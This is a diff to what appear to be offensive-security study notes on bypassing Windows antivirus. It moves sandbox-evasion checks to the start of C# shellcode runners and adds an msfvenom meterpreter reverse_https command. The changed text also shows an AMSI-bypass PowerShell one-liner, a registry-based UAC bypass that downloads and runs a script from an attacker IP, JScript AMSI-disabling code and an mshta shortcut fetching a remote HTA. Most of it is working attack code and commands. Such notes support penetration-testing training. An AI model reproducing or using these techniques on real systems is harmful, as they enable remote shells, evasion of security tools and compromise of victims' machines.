@@ -1105,6 +1105,8 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=44
 
 ### Encrypt the shellcode
 
+Hardcode the shellcode
+
 ```csharp
 using System;
 using System.Text;
@@ -1137,9 +1139,9 @@ namespace Helper
 }
 ```
 
-### helper.exe
+#### helper.exe
 
-`helper.exe <Kali IP> <filename>`
+`helper.exe <Kali IP> <msfvenom-generated csharp shellcode file>`
 
 ```csharp
 using System;
@@ -1221,6 +1223,8 @@ namespace Helper
 }
 ```
 
+Hardcode the shellcode
+
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -1296,7 +1300,7 @@ namespace BypassingAntivirus
 
 ### run.exe
 
-`run.exe <Kali IP> <filename>`
+`run.exe <Kali IP> <encrypted csharp shellcode file>`
 
 ```csharp
 using System;
@@ -1331,6 +1335,26 @@ namespace BypassingAntivirus
 
         static void Main(string[] args)
         {
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
+            if (flsindex == null)
+            {
+                return;
+            }
+
             // Check if a URL was provided
             if (args.Length != 2)
             {
@@ -1364,26 +1388,6 @@ namespace BypassingAntivirus
                         {
                             // Convert each hex string to a byte
                             buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
-                        }
-
-                        DateTime t1 = DateTime.Now;
-                        Sleep(2000);
-                        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
-                        if (t2 < 1.5)
-                        {
-                            return;
-                        }
-
-                        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-                        if (mem == null)
-                        {
-                            return;
-                        }
-
-                        IntPtr flsindex = FlsAlloc(IntPtr.Zero);
-                        if (flsindex == null)
-                        {
-                            return;
                         }
 
                         for (int i = 0; i < buf.Length; i++)
@@ -1509,6 +1513,26 @@ namespace BypassingAntivirus
 
         static void Main(string[] args)
         {
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
+            if (flsindex == null)
+            {
+                return;
+            }
+
             // Check if a URL was provided
             if (args.Length != 2)
             {
@@ -1542,26 +1566,6 @@ namespace BypassingAntivirus
                         {
                             // Convert each hex string to a byte
                             buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
-                        }
-
-                        DateTime t1 = DateTime.Now;
-                        Sleep(2000);
-                        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
-                        if (t2 < 1.5)
-                        {
-                            return;
-                        }
-
-                        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-                        if (mem == null)
-                        {
-                            return;
-                        }
-
-                        IntPtr flsindex = FlsAlloc(IntPtr.Zero);
-                        if (flsindex == null)
-                        {
-                            return;
                         }
 
                         for (int i = 0; i < buf.Length; i++)
@@ -1622,6 +1626,7 @@ namespace BypassingAntivirus
 ## Bypassing Antivirus in VBA
 
 ### Encrypt the shellcode
+
 ```csharp
 using System;
 using System.Text;
@@ -2102,6 +2107,10 @@ $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
 
 ### run4.txt
 
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
+```
+
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
@@ -2157,8 +2166,10 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
 ```
 
+Launch the high-integrity PowerShell prompt
+
 ```pwsh
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run4.txt') | IEX" –Force
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run4.txt') | IEX" -Force
 
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 
@@ -2184,6 +2195,7 @@ exploit
 ### Registry Key
 
 Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI and generate a reverse shell.
+
 ```js
 var sh = new ActiveXObject('WScript.Shell');
 var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
@@ -2202,7 +2214,8 @@ try{
 
 ### Rename wscript.exe to amsi.dll and executing it
 
-Prepend below code to the DotNetToJscript-generated shellcode runner 
+Prepend below code to the DotNetToJscript-generated shellcode runner
+
 ```js
 var filesys= new ActiveXObject("Scripting.FileSystemObject");
 var sh = new ActiveXObject('WScript.Shell');
@@ -2268,6 +2281,7 @@ extern "C" __declspec(dllexport) void run()
 ### Alternate Data Streams
 
 `test.js`
+
 ```js
 var shell = new ActiveXObject("WScript.Shell");
 var res = shell.Run("cmd.exe");
@@ -2498,6 +2512,7 @@ self.close();
 ```
 
 Shortcut target
+
 ```
 C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta
 ```
@@ -2520,7 +2535,6 @@ xmlns:user="http://mycompany.com/mynamespace">
 		]]>
 	</ms:script>
 </stylesheet>
-
 ```
 
 ```bat
